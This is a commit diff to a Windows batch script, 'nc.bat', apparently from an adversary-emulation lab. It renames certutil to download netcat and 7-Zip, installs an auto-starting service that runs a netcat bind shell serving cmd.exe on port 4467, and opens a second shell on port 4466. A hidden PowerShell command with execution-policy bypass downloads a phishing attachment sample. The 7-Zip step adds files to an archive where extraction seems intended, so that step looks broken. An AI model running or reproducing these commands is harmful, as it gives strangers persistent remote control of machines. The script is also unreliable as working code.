77e83500632bf19acc53a1b13ab1597b8e8c6eaf
inwestallis <inwestallis@gmail.com>
2020-02-25 11:18:01 +0300

    Update nc.bat

--- nc.bat
+++ nc.bat
@@ -1,11 +1,21 @@
 @echo on
 
-sc create XSample binPath= "cmd.exe /C C:\Users\lab-win10\Desktop\netcat\netcat-1.11\nc64.exe -nLvp 4467 -e cmd.exe" start= auto DisplayName= "XSample Service" & sc start XSample
+copy %windir%\system32\certutil.exe %temp%\cr.tmp
+
+%temp%\cr.tmp -urlcache -split -f https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip %Temp%/netcat-win32-1.11.zip
+
+%temp%\cr.tmp -urlcache -split -f https://github.com/daemondevin/7-ZipPortable/raw/master/App/7-Zip64/7z.exe %Temp%/7z.exe
+
+%Temp%\7z.exe a -mx1 %Temp%\netcat-win32-1.11.zip %Temp%\
+
+
+sc create XSample binPath= "cmd.exe /C %Temp%\nc64.exe -nLvp 4467 -e cmd.exe" start= auto DisplayName= "XSample Service" & sc start XSample
 
 C:\Windows\system32\calc.exe
+
 powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm?raw=true', 'C:\tools\s.xlsm')"
 
 
-C:\Users\lab-win10\Desktop\netcat\netcat-1.11\nc64.exe -nLvp 4466 -e cmd.exe
+%Temp%\nc64.exe -nLvp 4466 -e cmd.exe
 
 
